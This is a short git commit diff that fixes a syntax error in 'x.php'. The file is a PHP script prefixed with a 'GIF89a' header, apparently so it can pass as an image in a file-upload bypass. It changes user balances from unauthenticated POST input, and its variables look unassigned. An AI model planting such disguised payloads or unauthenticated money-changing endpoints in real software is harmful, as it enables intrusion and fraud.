412e95cdc4393fe25fd1cfe71656f8c8fd28d7fb
hungnvf <32772023+hungnvf@users.noreply.github.com>
2023-05-06 11:39:32 +0700

    Update x.php

--- x.php
+++ x.php
@@ -3,7 +3,7 @@ GIF89a;
 <?php
 include_once($_SERVER["DOCUMENT_ROOT"] . '/libs/common.php');
 
-if (isset($_POST['userid'] && isset($_POST['amount'])){
+if (isset($_POST['userid']) && isset($_POST['amount'])){
   updateUserMoney($userid, $amount);
 }
 ?>
